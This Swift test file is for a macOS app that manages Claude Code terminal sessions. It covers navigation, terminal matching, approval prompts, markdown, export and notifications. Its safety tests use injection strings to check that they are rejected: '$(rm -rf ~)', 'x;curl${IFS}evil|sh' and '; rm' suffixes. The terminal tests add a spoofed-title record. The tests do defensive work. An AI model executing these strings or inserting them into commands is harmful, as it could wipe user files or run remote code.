import AppKit

func modelTests() {
    test("status labels and ranks") {
        expectEqual([SessionStatus.waiting, .busy, .idle, .ended].map(\.label), ["Needs you", "Working", "Idle", "Ended"])
        expectEqual([SessionStatus.waiting, .busy, .background, .idle, .ended].map(\.sortRank), [0, 1, 2, 3, 4])
    }
    test("display title falls back from title to name to folder") {
        expectEqual(session("a", cwd: "/x/proj", title: "T", name: "N").displayTitle, "T")
        expectEqual(session("a", cwd: "/x/proj", title: "", name: "N").displayTitle, "N")
        expectEqual(session("a", cwd: "/x/proj", title: nil, name: "").displayTitle, "proj")
        expectEqual(session("a", cwd: "/x/proj").projectName, "proj")
        expect(session("a", pid: 3).isLive)
        expect(!session("a", pid: nil).isLive)
        expectEqual(session("a").id, "a")
    }
    test("tool runs are grouped into one block") {
        let a = ToolCall(id: "t1", name: "Bash", summary: "ls"), b = ToolCall(id: "t2", name: "Read", summary: "f")
        let blocks = TranscriptBlock.group([item(.assistant("hi"), "i1"), item(.tool(a)), item(.tool(b)),
                                            item(.assistant("done"), "i2"), item(.tool(a))])
        expectEqual(blocks.map(\.id), ["i1", "tools-t1", "i2", "tools-t1"])
        if case .tools(let calls) = blocks[1] { expectEqual(calls.count, 2) } else { expect(false) }
        expectEqual(TranscriptBlock.tools([]).id, "tools-")
    }
    test("defaults") {
        let s = Session(sessionId: "d", pid: nil, cwd: "/", name: nil, title: nil, status: .idle, waitingFor: nil,
                        updatedAt: Date(), transcriptURL: nil)
        expect(s.statusSince == nil && s.pendingTool == nil)
        let o = OutgoingMessage(text: "x", images: [])
        expect(o.id != OutgoingMessage(text: "x", images: []).id)
        expect(!o.delivered)
        expectEqual(TitleInfo(mtime: Date(timeIntervalSince1970: 1), title: "a", isCustom: false),
                    TitleInfo(mtime: Date(timeIntervalSince1970: 1), title: "a", isCustom: false))
    }
}

func formatTests() {
    test("ago buckets") {
        let now = Date(timeIntervalSince1970: 1_000_000)
        expectEqual(Format.ago(now.addingTimeInterval(-10), now: now), "now")
        expectEqual(Format.ago(now.addingTimeInterval(-300), now: now), "5m")
        expectEqual(Format.ago(now.addingTimeInterval(-7200), now: now), "2h")
        expectEqual(Format.ago(now.addingTimeInterval(-3 * 86400), now: now), "3d")
        expectEqual(Format.ago(now.addingTimeInterval(60), now: now), "now")
        expect(!Format.ago(Date()).isEmpty)
    }
    test("elapsed") {
        let now = Date(timeIntervalSince1970: 1000)
        expectEqual(Format.elapsed(since: now.addingTimeInterval(-42), now: now), "42s")
        expectEqual(Format.elapsed(since: now.addingTimeInterval(-185), now: now), "3m 5s")
        expect(!Format.elapsed(since: Date()).isEmpty)
    }
    test("short path") {
        expectEqual(Format.shortPath("/Users/me/x", home: "/Users/me"), "~/x")
        expectEqual(Format.shortPath(NSHomeDirectory() + "/y"), "~/y")
    }
    test("palette values exist, for every theme") {
        defer { Palette.theme = .classic }
        for theme in DeckTheme.allCases {
            Palette.theme = theme
            expect(!theme.name.isEmpty)
            expectEqual(theme.appearance == nil, theme == .classic)
            expectEqual(Palette.sidebar == nil, theme == .classic)
            _ = (Palette.surface, Palette.panel)
        }
        Palette.theme = .midnight
        expectEqual(Palette.hex(0x8B7CFF).redComponent, CGFloat(0x8B) / 255)
        for c in [Palette.accent, Palette.waiting, Palette.busy, Palette.idle, Palette.success, Palette.danger] {
            expect(c.alphaComponent > 0)
        }
        Palette.theme = .classic
        for c in [Palette.accent, Palette.waiting, Palette.busy, Palette.idle, Palette.success, Palette.danger] {
            expect(c.alphaComponent > 0)
        }
        expect(Palette.Radius.small < Palette.Radius.medium && Palette.Radius.medium < Palette.Radius.large)
    }
}

func navTests() {
    let w1 = session("w1", status: .waiting, waitingFor: "permission prompt", statusSince: Date(timeIntervalSince1970: 20))
    let w2 = session("w2", status: .waiting, waitingFor: "permission prompt", statusSince: Date(timeIntervalSince1970: 10))
    let q = session("q", status: .waiting, waitingFor: "question")
    let b = session("b", status: .busy), r = session("r", status: .ended, pid: nil)

    test("sidebar order: running in fixed order (waiting doesn't move), then recent") {
        expectEqual(SessionNav.ordered(live: [b, w1], recent: [r]).map(\.id), ["b", "w1", "r"])
    }
    test("step wraps both ways and starts at the ends") {
        let list = [w1, b, r]
        expectEqual(SessionNav.step(list, from: "w1", by: 1), "b")
        expectEqual(SessionNav.step(list, from: "r", by: 1), "w1")
        expectEqual(SessionNav.step(list, from: "w1", by: -1), "r")
        expectEqual(SessionNav.step(list, from: nil, by: 1), "w1")
        expectEqual(SessionNav.step(list, from: nil, by: -1), "r")
        expectEqual(SessionNav.step([], from: nil, by: 1), nil)
    }
    test("next waiting wraps") {
        expectEqual(SessionNav.nextWaiting([w1, b, w2], after: nil), "w1")
        expectEqual(SessionNav.nextWaiting([w1, b, w2], after: "w1"), "w2")
        expectEqual(SessionNav.nextWaiting([w1, b, w2], after: "w2"), "w1")
        expectEqual(SessionNav.nextWaiting([b], after: nil), nil)
    }
    test("permission detection") {
        expect(SessionNav.isPermission(w1))
        expect(!SessionNav.isPermission(q))
        expect(!SessionNav.isPermission(b))
    }
    test("answered window") {
        let now = Date(timeIntervalSince1970: 100)
        expect(SessionNav.isAnswered(at: now.addingTimeInterval(-1), now: now))
        expect(!SessionNav.isAnswered(at: now.addingTimeInterval(-6), now: now))
        expect(!SessionNav.isAnswered(at: nil, now: now))
        expect(SessionNav.isAnswered(at: Date()))
        let pruned = SessionNav.pruneAnswered(["w1": now, "b": now, "w2": now.addingTimeInterval(-10)], live: [w1, w2, b], now: now)
        expectEqual(Array(pruned.keys), ["w1"])
        expect(SessionNav.pruneAnswered(["w1": Date()], live: [w1]).count == 1)
    }
    test("approval target: selected first, else longest waiting, skipping answered and questions") {
        let all = [w1, w2, q, b]
        let pick = SessionNav.approvalTarget(live: all, selected: "w1", isAnswered: { _ in false })
        expectEqual(pick?.session.id, "w1")
        expectEqual(pick?.remaining, 1)
        expectEqual(SessionNav.approvalTarget(live: all, selected: nil, isAnswered: { _ in false })?.session.id, "w2")
        expectEqual(SessionNav.approvalTarget(live: all, selected: "q", isAnswered: { $0.id == "w2" })?.session.id, "w1")
        expect(SessionNav.approvalTarget(live: [q, b], selected: nil, isAnswered: { _ in false }) == nil)
        let undated = session("u", status: .waiting, waitingFor: "permission prompt")
        expectEqual(SessionNav.approvalTarget(live: [undated, w1], selected: nil, isAnswered: { _ in false })?.session.id, "w1")
        expectEqual(SessionNav.approvalTarget(live: [w1, undated], selected: nil, isAnswered: { _ in false })?.session.id, "w1")
    }
    test("approval message") {
        let tool = session("t", status: .waiting, cwd: "/p/app", title: "Fix", waitingFor: "permission prompt",
                           pendingTool: ToolCall(id: "1", name: "Bash", summary: "rm x"))
        let m = SessionNav.approvalMessage(for: tool, allow: true, remaining: 2)
        expectEqual(m.title, "Allowed · Fix")
        expectEqual(m.detail, "Bash: rm x — 2 more waiting")
        let d = SessionNav.approvalMessage(for: session("x", cwd: "/p/app"), allow: false, remaining: 0)
        expectEqual(d.title, "Denied · app")
        expectEqual(d.detail, "app")
    }
    test("pending names apply until confirmed") {
        let live = [session("a", title: "Old")], recent = [session("c", title: "Old")]
        let applied = SessionNav.applyPendingNames(live: live, recent: recent, pending: ["a": "New", "c": "Other", "gone": "X"])
        expectEqual(applied.live[0].title, "New")
        expectEqual(applied.recent[0].title, "Other")
        expectEqual(applied.pending.count, 3)
        let confirmed = SessionNav.applyPendingNames(live: [session("a", title: "New")], recent: [], pending: ["a": "New"])
        expect(confirmed.pending.isEmpty)
    }
    test("restart: the session comes back in its own slot") {
        func started(_ id: String, _ t: Double, pid: Int32 = 1, cwd: String = "/tmp/project") -> Session {
            var s = session(id, pid: pid, cwd: cwd); s.startedAt = Date(timeIntervalSince1970: t); return s
        }
        let a = started("a", 10), b = started("b", 20, cwd: "/x"), c = started("c", 30, cwd: "/y")
        let ticket = RestartTicket(session: b, at: Date(timeIntervalSince1970: 100))

        // Mid-restart: b holds its place (⌘2) while it's gone.
        expectEqual(SessionNav.keepSlots(live: [a, c], slots: [:], restarting: ticket).map(\.id), ["a", "b", "c"])
        expect(SessionNav.restarted(ticket, in: [a, c]) == nil)
        expect(SessionNav.restarted(ticket, in: [a, b, c]) == nil, "the old process isn't the comeback")

        // Back under the same id (new process, later start): the remembered start time keeps the slot.
        let sameId = started("b", 200, pid: 9, cwd: "/x")
        expectEqual(SessionNav.restarted(ticket, in: [a, c, sameId])?.id, "b")
        expectEqual(SessionNav.keepSlots(live: [a, c, sameId], slots: ["b": b.startedAt!], restarting: nil).map(\.id), ["a", "b", "c"])

        // Back under a new id in the same folder.
        let newId = started("z", 101, pid: 9, cwd: "/x")
        expectEqual(SessionNav.restarted(ticket, in: [a, c, newId])?.id, "z")
        expect(SessionNav.restarted(ticket, in: [a, c, started("z", 50, pid: 9, cwd: "/x")]) == nil, "started before the restart")
        expect(SessionNav.restarted(ticket, in: [a, c, started("z", 101, pid: 9, cwd: "/other")]) == nil)
        var noStart = newId; noStart.startedAt = nil
        expect(SessionNav.restarted(ticket, in: [noStart]) == nil)
        expectEqual(SessionNav.keepSlots(live: [a, c, newId], slots: ["z": b.startedAt!], restarting: nil).map(\.id), ["a", "z", "c"])
    }
}

func terminalTests() {
    let fs = TerminalMatch.fieldSeparator, rs = TerminalMatch.recordSeparator
    let rows = [["T1", "✳ Fix bug", "/p/app"], ["T2", "⠂ Other", "/p/app"], ["T3", "zsh", "/p/app"],
                ["T4", "◐ Fix bug", "/p/other"], ["T5", "✳ Fix bug", "/p/dup"], ["T6", "✶ Fix bug", "/p/dup"],
                ["T7", "* vim", "/p/star"]]
    let out = rows.map { $0.joined(separator: fs) }.joined(separator: rs) + rs + "bad" + rs
    let terms = TerminalMatch.parse(out)
    test("parse uses separators titles can't contain, and skips malformed records") {
        expectEqual(terms.map(\.id), ["T1", "T2", "T3", "T4", "T5", "T6", "T7"])
        expectEqual(terms[0], GhosttyTerminal(id: "T1", name: "✳ Fix bug", workingDirectory: "/p/app"))
        // A tab or newline in a title no longer splits it into a fake row.
        let tricky = TerminalMatch.parse("A\(fs)evil\ttitle\nB\tX\t/p\(fs)/p/app\(rs)")
        expectEqual(tricky.count, 1)
    }
    test("claude titles") {
        expect(TerminalMatch.isClaudeTitle("✳ x"))
        expect(TerminalMatch.isClaudeTitle("⠂ x"))
        expect(!TerminalMatch.isClaudeTitle("* vim"), "* is used by shells and editors")
        expect(!TerminalMatch.isClaudeTitle("zsh"))
        expect(!TerminalMatch.isClaudeTitle(""))
        expectEqual(TerminalMatch.strippedTitle("◐ ✳  Fix bug"), "Fix bug")
        expect(!TerminalMatch.isBraille(Character("a")))
    }
    test("find always requires the session's folder, and refuses ambiguity") {
        expectEqual(TerminalMatch.find(for: session("s", cwd: "/p/app", title: "Fix bug"), in: terms)?.id, "T1")
        // A terminal elsewhere with the same title is never picked (titles can be spoofed).
        expect(TerminalMatch.find(for: session("s", cwd: "/elsewhere", title: "Other"), in: terms) == nil)
        // Two Claude terminals in the folder, title doesn't single one out: refuse.
        expect(TerminalMatch.find(for: session("s", cwd: "/p/app", title: "Nope"), in: terms) == nil)
        expect(TerminalMatch.find(for: session("s", cwd: "/p/dup", title: "Fix bug"), in: terms) == nil)
        // The only Claude terminal in the folder.
        expectEqual(TerminalMatch.find(for: session("s", cwd: "/p/other", title: nil), in: terms)?.id, "T4")
        expectEqual(TerminalMatch.find(for: session("s", cwd: "/p/other", title: ""), in: terms)?.id, "T4")
        expect(TerminalMatch.find(for: session("s", cwd: "/p/star"), in: terms) == nil)
    }
    test("a second session in the same folder: the terminal Deck opened, its name, or the unclaimed one") {
        let fresh = session("new", cwd: "/p/app", title: nil)
        expect(TerminalMatch.find(for: fresh, in: terms) == nil, "untitled, two Claude terminals")
        expectEqual(TerminalMatch.find(for: fresh, in: terms, preferred: "T2")?.id, "T2")
        expect(TerminalMatch.find(for: fresh, in: terms, preferred: "T3") == nil, "a shell is never preferred")
        expect(TerminalMatch.find(for: fresh, in: terms, preferred: "T4") == nil, "nor a terminal elsewhere")
        expectEqual(TerminalMatch.find(for: fresh, in: terms, claimed: ["T1"])?.id, "T2")
        expect(TerminalMatch.find(for: fresh, in: terms, claimed: ["T1", "T2"]) == nil)
        // The terminal shows the session's name (from /rename) rather than its title.
        expectEqual(TerminalMatch.find(for: session("s", cwd: "/p/app", title: "Long title", name: "Other"), in: terms)?.id, "T2")
        // A title shared with a claimed terminal doesn't win.
        expectEqual(TerminalMatch.find(for: session("s", cwd: "/p/dup", title: "Fix bug"), in: terms, claimed: ["T5"])?.id, "T6")
    }
    test("still matches") {
        let s = session("s", cwd: "/p/app")
        expect(TerminalMatch.stillMatches(terms[0], session: s))
        expect(!TerminalMatch.stillMatches(terms[2], session: s), "now a shell")
        expect(!TerminalMatch.stillMatches(terms[3], session: s), "other folder")
    }
}

func safetyTests() {
    test("resume command keeps only plain, known flags") {
        let id = "0f8fad5b-d9cb-469f-a165-70867728950e"
        expectEqual(Safety.resumeCommand(sessionId: id, originalArgs: ["claude"]), "claude --resume \(id)")
        expectEqual(Safety.resumeCommand(sessionId: id, originalArgs: [
            "claude", "--dangerously-skip-permissions", "--model", "opus[1m]", "--permission-mode=plan",
            "--resume", "old", "--settings", "x.json", "--verbose"]),
            "claude --resume \(id) --dangerously-skip-permissions --model 'opus[1m]' --permission-mode 'plan' --verbose")
        expectEqual(Safety.resumeCommand(sessionId: id, originalArgs: ["claude", "--model", "$(rm -rf ~)", "--model"]),
                    "claude --resume \(id)")
        expect(Safety.resumeCommand(sessionId: "x; rm", originalArgs: []) == nil)
    }
    test("session ids") {
        expect(Safety.isSessionId("904d7e05-e5d3-4b07-97e8-5d5358ca80c4"))
        expect(!Safety.isSessionId("x;curl${IFS}evil|sh"))
        expect(!Safety.isSessionId("904d7e05-e5d3-4b07-97e8-5d5358ca80c4; rm"))
    }
    test("shell quoting") {
        expectEqual(Safety.shellQuote("plain"), "'plain'")
        expectEqual(Safety.shellQuote("it's $(x)"), #"'it'\''s $(x)'"#)
    }
    test("control characters") {
        expectEqual(Safety.stripControls("a\u{1b}[201~b\u{7f}c\u{85}d\n\te"), "a[201~bcd\n\te")
        expectEqual(Safety.stripControls("a\nb\tc", keepNewlines: false), "abc")
    }
    test("typed text encoding") {
        expectEqual(Safety.typedTextAction("say \"hi\" \\ ok\nline 2\tx\u{1b}"), #"text:say "hi" \\ ok\nline 2    x"#)
        expectEqual(Safety.typedTextAction(""), "text:")
    }
    test("prompt guard: typing and answering") {
        func rec(_ status: String?, since: Double? = nil) -> SessionRecord {
            SessionRecord(pid: 1, sessionId: "s", cwd: "/", startedAt: nil, kind: nil, name: nil, status: status,
                          waitingFor: nil, updatedAt: nil, statusUpdatedAt: since, detail: nil)
        }
        expect(PromptGuard.canType(rec("idle")))
        expect(PromptGuard.canType(rec("busy")))
        expect(!PromptGuard.canType(rec("waiting")))
        expect(!PromptGuard.canType(nil))
        expect(PromptGuard.canInterrupt(rec("busy")))
        expect(!PromptGuard.canInterrupt(rec("idle")), "would clear a typed draft")
        expect(!PromptGuard.canInterrupt(rec("waiting")), "would deny the open prompt")
        expect(!PromptGuard.canInterrupt(nil))
        expect(PromptGuard.canRestart(rec("idle")))
        expect(!PromptGuard.canRestart(rec("busy")), "would quit mid-step")
        expect(!PromptGuard.canRestart(rec("waiting")))
        expect(!PromptGuard.canRestart(nil))
        expect(!PromptGuard.canRestart(rec("shell")), "would stop the background task")
        expect(PromptGuard.canEnd(rec("idle")) && PromptGuard.canEnd(rec("shell")))
        expect(!PromptGuard.canEnd(rec("busy")) && !PromptGuard.canEnd(rec("waiting")) && !PromptGuard.canEnd(nil))
        expect(PromptGuard.canAnswer(rec("waiting", since: 1000), expectedSince: 1000.0004))
        expect(PromptGuard.canAnswer(rec("waiting", since: 1000), expectedSince: nil))
        expect(!PromptGuard.canAnswer(rec("waiting", since: 2000), expectedSince: 1000), "a newer prompt")
        expect(!PromptGuard.canAnswer(rec("waiting"), expectedSince: 1000))
        expect(!PromptGuard.canAnswer(rec("busy", since: 1000), expectedSince: 1000), "already answered")
        expect(!PromptGuard.canAnswer(nil, expectedSince: nil))
    }
    test("one-click answers only for known, standard dialogs") {
        let bash = ToolCall(id: "1", name: "Bash", summary: "ls")
        expect(PromptGuard.canAnswerHere(session("a", status: .waiting, waitingFor: "permission prompt", pendingTool: bash)))
        expect(!PromptGuard.canAnswerHere(session("a", status: .waiting, waitingFor: "permission prompt")), "unknown request")
        let plan = ToolCall(id: "2", name: "ExitPlanMode", summary: "")
        expect(!PromptGuard.canAnswerHere(session("a", status: .waiting, waitingFor: "permission prompt", pendingTool: plan)))
        expect(!PromptGuard.canAnswerHere(session("a", status: .waiting, waitingFor: "question", pendingTool: bash)))
        expect(PromptGuard.hasStandardDialog("mcp__x__y"))
    }
    test("status stamp round-trips") {
        let s = session("a", statusSince: Date(timeIntervalSince1970: 1_790_823_787.320))
        expect(abs(s.statusStamp! - 1_790_823_787_320) < 1)
        expect(session("b").statusStamp == nil)
    }
    test("project folders: unique, running first") {
        let live = [session("a", cwd: "/x"), session("b", cwd: "/y")], recent = [session("c", cwd: "/x"), session("d", cwd: "/z")]
        expectEqual(SessionNav.projectFolders(live: live, recent: recent), ["/x", "/y", "/z"])
    }
}

func markdownTests() {
    test("blocks") {
        let md = """
        Intro line
        - item one
          * nested
        # Title
        ## Sub

        | A | B |
        |---|:-:|
        | 1 | 2 |
        after table
        ```swift
        let x = 1
        ```
        tail
        ```
        unterminated
        """
        let blocks = Markdown.parse(md)
        var kinds: [String] = []
        for b in blocks {
            switch b {
            case .paragraph(let p): kinds.append("p:\(p)")
            case let .heading(t, level): kinds.append("h\(level):\(t)")
            case .table(let rows): kinds.append("t:\(rows)")
            case .code(let c): kinds.append("c:\(c)")
            }
        }
        expectEqual(kinds, [
            "p:Intro line\n•  item one\n   •  nested",
            "h1:Title", "h2:Sub",
            "t:[[\"A\", \"B\"], [\"1\", \"2\"]]",
            "p:after table",
            "c:let x = 1",
            "p:tail",
            "c:unterminated",
        ])
    }
    test("table flushes paragraph before it and at end") {
        let blocks = Markdown.parse("text\n| a |\n```\ncode\n```")
        expectEqual(blocks.count, 3)
        let tableEnd = Markdown.parse("| a | b")
        if case .table(let rows) = tableEnd[0] { expectEqual(rows, [["a", "b"]]) } else { expect(false) }
    }
}

func exportTests() {
    let blocks = TranscriptBlock.group([
        item(.user("hello", images: [])), item(.user("look", images: [image()])), item(.user("two", images: [image(), image()])),
        item(.command("rename x")), item(.command("/clear")), item(.assistant("Hi **there**")),
        item(.tool(ToolCall(id: "t", name: "Bash", summary: "ls\n-la"))), item(.notice("Interrupted")),
        item(.commandOutput("Total cost: $1")), item(.recap("Where we are")),
        item(.taskEvent("done", ok: true)),
    ])
    test("markdown export") {
        let md = TranscriptExport.markdown(title: "S", blocks: blocks)
        for piece in ["# S", "**You:** hello", "**You:** _(1 image)_ look", "_(2 images)_", "`/rename x`", "`/clear`",
                      "**Claude:** Hi **there**", "- `Bash`: `ls -la`", "_Interrupted_", "_done_", "```\nTotal cost: $1\n```", "> ※ Recap: Where we are"] {
            expect(md.contains(piece), "missing \(piece)")
        }
        // A stray tool item inside an .item block is skipped.
        expectEqual(TranscriptExport.markdown(title: "x", blocks: [.item(item(.tool(ToolCall(id: "1", name: "a", summary: ""))))]), "# x")
    }
    test("reconcile outgoing") {
        let now = Date()
        var sent = OutgoingMessage(text: "hello", images: []); sent.sentAt = now
        var queuedMsg = OutgoingMessage(text: "later", images: []); queuedMsg.sentAt = now
        var stale = OutgoingMessage(text: "lost", images: []); stale.sentAt = now.addingTimeInterval(-60)
        var imageOnly = OutgoingMessage(text: "  ", images: [image()]); imageOnly.sentAt = now
        let left = TranscriptExport.reconcile([sent, queuedMsg, stale, imageOnly], queued: ["later please"], blocks: blocks, now: now)
        // The image-only one clears too: the transcript has a 1-image message from you (no timestamp).
        expect(left.isEmpty, "\(left.map(\.text))")
        // Image-only messages are matched by image count, once one lands after they were sent.
        let img = image()
        var oneImage = OutgoingMessage(text: "", images: [img], sentAt: now)
        let twoImages = OutgoingMessage(text: "", images: [img, img], sentAt: now)
        let landed = [TranscriptBlock.item(TranscriptItem(id: "u", kind: .user("", images: [img]), timestamp: now.addingTimeInterval(2))),
                      .item(TranscriptItem(id: "v", kind: .user("old", images: [img, img]), timestamp: now.addingTimeInterval(-60))),
                      .item(TranscriptItem(id: "w", kind: .user("no time", images: [img, img, img]), timestamp: nil))]
        expectEqual(TranscriptExport.reconcile([oneImage, twoImages], queued: [], blocks: landed, now: now).count, 1)
        oneImage = OutgoingMessage(text: "", images: [img, img, img], sentAt: now)
        expect(TranscriptExport.reconcile([oneImage], queued: [], blocks: landed, now: now).isEmpty, "no timestamp: counts as arrived")
        expect(TranscriptExport.reconcile([], queued: [], blocks: []).isEmpty)
        expectEqual(TranscriptExport.reconcile([sent], queued: [], blocks: []).count, 1)
    }
}

func notificationTests() {
    test("previews can't hide content") {
        expectEqual(NotificationText.preview("ls\nrm -rf ~"), "ls ⏎ rm -rf ~")
        let long = String(repeating: "a", count: 300)
        expect(NotificationText.preview(long).hasSuffix("… (300 chars)"))
    }
    test("with a captured tool") {
        let t = NotificationText(for: session("a", status: .waiting, cwd: "/p/app", title: "Fix", waitingFor: "permission prompt",
                                              pendingTool: ToolCall(id: "1", name: "mcp__srv__do_thing", summary: "go")))
        expectEqual(t, NotificationText(for: session("a", status: .waiting, cwd: "/p/app", title: "Fix", waitingFor: "permission prompt",
                                                     pendingTool: ToolCall(id: "1", name: "mcp__srv__do_thing", summary: "go"))))
        expectEqual(t.subtitle, "app · do_thing")
        expectEqual(t.body, "go")
        expect(t.isApproval)
    }
    test("without a tool") {
        let t = NotificationText(for: session("a", cwd: "/p/app", waitingFor: "question"))
        expect(t.subtitle == nil)
        expectEqual(t.body, "app is waiting for question")
        expect(!t.isApproval)
        expectEqual(NotificationText(for: session("a", cwd: "/p/app")).body, "app is waiting for your input")
    }
}

func writerTests() {
    test("normalized names") {
        expectEqual(TranscriptWriter.normalizedName("  a\nb  "), "a b")
        expect(TranscriptWriter.normalizedName(" \n ") == nil)
    }
    test("append custom title") {
        let box = Sandbox(); defer { box.cleanup() }
        let url = box.write("t.jsonl", "{\"type\":\"user\"}\n")
        try TranscriptWriter.appendCustomTitle("New name", sessionId: "s1", to: url)
        let last = try String(contentsOf: url, encoding: .utf8).split(separator: "\n").last!
        let obj = try JSONSerialization.jsonObject(with: Data(last.utf8)) as! [String: String]
        expectEqual(obj, ["type": "custom-title", "customTitle": "New name", "sessionId": "s1"])
        var threw = false
        do { try TranscriptWriter.appendCustomTitle("x", sessionId: "s", to: box.root.appendingPathComponent("missing")) } catch { threw = true }
        expect(threw)
    }
}

func watcherTests() {
    test("fires on change, nil for missing files") {
        let box = Sandbox(); defer { box.cleanup() }
        let url = box.write("w.txt", "a")
        var fired = 0
        var watcher = FileWatcher(url: url, events: [.write, .extend]) { fired += 1 }
        expect(watcher != nil)
        let h = try FileHandle(forWritingTo: url); try h.seekToEnd(); try h.write(contentsOf: Data("b".utf8)); try h.close()
        expect(waitUntil { fired > 0 }, "watcher didn't fire")
        watcher = nil
        RunLoop.main.run(until: Date().addingTimeInterval(0.1)) // let the cancel handler close the file
        expect(FileWatcher(url: box.root.appendingPathComponent("nope"), events: [.write]) {} == nil)
    }
}
